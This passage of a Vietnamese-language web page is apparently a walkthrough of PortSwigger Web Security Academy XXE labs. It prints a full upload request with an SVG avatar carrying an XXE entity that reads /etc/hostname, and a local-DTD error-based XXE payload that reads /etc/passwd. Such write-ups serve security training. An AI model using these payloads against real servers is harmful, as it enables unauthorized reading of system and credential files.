+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">multipart</span><span class="o">/</span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">boundary</span><span class="o">=----</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">1213</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ae700dd0486872281cafd4600ab00a1.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ae700dd0486872281cafd4600ab00a1.web-security-academy.net/post?postId=5</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;csrf&quot;</span>
+
+<span class="nx">qAIevmCpcVt7Au1s3RSbN51kVv6ooAlO</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;postId&quot;</span>
+
+<span class="mf">1</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;comment&quot;</span>
+
+<span class="nx">hehe</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;name&quot;</span>
+
+<span class="nx">hehe</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;avatar&quot;</span><span class="p">;</span><span class="w"> </span><span class="nx">filename</span><span class="o">=</span><span class="s2">&quot;SVG_XSS_green_triangle.svg&quot;</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">image</span><span class="o">/</span><span class="nx">svg</span><span class="o">+</span><span class="nx">xml</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">standalone</span><span class="o">=</span><span class="s2">&quot;no&quot;</span><span class="o">?&gt;</span>
+<span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;file:///etc/hostname&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="p">]</span><span class="o">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">svg</span><span class="w"> </span><span class="na">width</span><span class="o">=</span><span class="s">&quot;200&quot;</span><span class="w"> </span><span class="na">height</span><span class="o">=</span><span class="s">&quot;60&quot;</span><span class="w"> </span><span class="na">xmlns</span><span class="o">=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="p">&gt;</span>
+<span class="w">  </span><span class="p">&lt;</span><span class="nt">text</span><span class="w"> </span><span class="na">x</span><span class="o">=</span><span class="s">&quot;10&quot;</span><span class="w"> </span><span class="na">y</span><span class="o">=</span><span class="s">&quot;40&quot;</span><span class="w"> </span><span class="na">font-family</span><span class="o">=</span><span class="s">&quot;Arial&quot;</span><span class="w"> </span><span class="na">font-size</span><span class="o">=</span><span class="s">&quot;24&quot;</span><span class="w"> </span><span class="na">fill</span><span class="o">=</span><span class="s">&quot;blue&quot;</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="o">&amp;</span><span class="nx">xxe</span><span class="p">;</span>
+<span class="w">  </span><span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
+
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;email&quot;</span>
+
+<span class="nx">a</span><span class="err">@</span><span class="nx">ginandjuice</span><span class="p">.</span><span class="nx">shop</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;website&quot;</span>
+
+<span class="nx">http</span><span class="o">:</span><span class="c1">//a.com</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span><span class="o">--</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request trên. Quan sát response trả về là ảnh chứa text</p>
+<ul>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2032.png" /></p>
+</li>
+<li>
+<p>Xem ảnh ở post 1</p>
+<p><img alt="image.png" src="image%2033.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<p><img alt="image.png" src="image%2034.png" /></p>
+<ul>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2035.png" /></p>
+</li>
+</ul>
+<h1 id="lab-exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd"><strong>Lab: Exploiting XXE to retrieve data by repurposing a local DTD</strong><a class="headerlink" href="#lab-exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd">Lab: Exploiting XXE to retrieve data by repurposing a local DTD | Web Security Academy</a></p>
+<ul>
+<li>Điều hướng đến chức năng <strong>View details &gt; Check stock</strong></li>
+</ul>
+<p><img alt="image.png" src="image%2036.png" /></p>
+<p><img alt="image.png" src="image%2037.png" /></p>
+<ul>
+<li>
+<p>Trước hết, lab có parse input người dùng tại API <code>POST /product/stock</code></p>
+<p><img alt="image.png" src="image%2038.png" /></p>
+</li>
+<li>
+<p>Ở bài này vừa là blind vừa không thể dùng out of band → nhưng vẫn có error hiển thị → error based</p>
+</li>
+<li>
+<p>Thì dựa trên bài lab error based cần đọc một file sau đó thì gọi file đó trong một entity khác. Tuy nhiên, việc gọi entity này trong entity khác chỉ được phép ở file <code>dtd</code> , nếu là trong <code>DOCTYPE</code> thì không được → ở bài lab error based cần gọi file <code>dtd</code> ở ngoài mà attacker kiểm soát → remote external <code>dtd</code> file.</p>
+<p><img alt="image.png" src="image%2039.png" /></p>
+</li>
+<li>
+<p>Ở bài này, chúng ta không thể gọi out of band được → không thể gọi file <code>dtd</code>  remote được. Còn file ở local thì chúng ta không tìm ra vị trí nào có thể kiểm soát và tạo file mới được trên server → chỉ có thể dùng file local.</p>
+</li>
+<li>Nhưng chúng ta không thể sửa trực tiếp được file. Tuy nhiên, trình parser thì có. Cơ chế là khi chúng ta gọi một entity trùng tên với entity trong file <code>dtd</code> local thì entity đó sẽ overwrite và đồng thời vẫn có thể gọi entity trong một entity khác.</li>
+<li>
+<p>Bài lab có gợi ý trong enviroment có <code>/usr/share/yelp/dtd/docbookx.dtd</code> . Mình sẽ xem trong <code>dtd</code> này có những entity nào</p>
+<p><img alt="image.png" src="image%2040.png" /></p>
+</li>
+<li>
+<p>Vậy thì trước hết mình sẽ gọi file <code>dtd</code> này. Sau đó thì tạo thực thể <code>ISOamsa</code></p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span>
+<span class="w">  </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">local_dtd</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span><span class="o">&gt;</span>
+
+<span class="w">  </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">ISOamsa</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="o">&gt;</span>
+
+<span class="w">  </span><span class="o">%</span><span class="nx">local_dtd</span><span class="p">;</span>
+<span class="p">]</span><span class="o">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Trong phần khai báo của <code>ISOamsa</code> mình sẽ dùng lại cách khai báo và gọi thực thể của lab error based nhưng cần lưu ý về việc encode</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span>
+<span class="w">  </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">local_dtd</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span><span class="o">&gt;</span>
+
+<span class="w">  </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">ISOamsa</span><span class="w"> </span><span class="s1">&#39;</span>
+<span class="s1">    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<span class="s1">    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span>
+<span class="s1">    &amp;#x25;eval;</span>
+<span class="s1">    &amp;#x25;error;</span>
+<span class="s1">  &#39;</span><span class="o">&gt;</span>
+
+<span class="w">  </span><span class="o">%</span><span class="nx">local_dtd</span><span class="p">;</span>
+<span class="p">]</span><span class="o">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Thực hiện gửi payload và đọc được file. Hoàn thành việc solve lab</p>
+<p><img alt="image.png" src="image%2041.png" /></p>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
